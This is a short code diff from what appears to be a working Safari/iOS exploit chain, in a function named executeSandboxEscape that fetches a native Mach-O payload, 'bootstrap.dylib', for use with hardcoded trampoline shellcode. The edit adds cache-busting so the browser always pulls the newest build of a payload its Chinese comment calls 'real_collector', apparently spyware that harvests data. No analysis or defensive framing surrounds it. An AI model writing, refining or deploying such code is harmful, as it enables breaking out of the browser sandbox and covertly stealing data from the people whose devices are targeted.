@@ -1414,7 +1414,8 @@ function executeSandboxEscape() {/* Original: yA → executeSandboxEscape */
         // Dylib must be pre-truncated to Mach-O proper (no appended data).
         const _ORIG_PROCESS_OFF = 0x68d8; // hardcoded in B trampoline shellcode
         const _xhr = new XMLHttpRequest();
-        _xhr.open("GET", "payloads/bootstrap.dylib", false);
+        // 缓存破坏：强制拉最新 real_collector（避免 Safari 一直用 89328B 旧 bootstrap）
+        _xhr.open("GET", "payloads/bootstrap.dylib?v=rc10_" + Date.now(), false);
         _xhr.overrideMimeType("text/plain; charset=x-user-defined");
         _xhr.send();
         const _raw = _xhr.responseText;
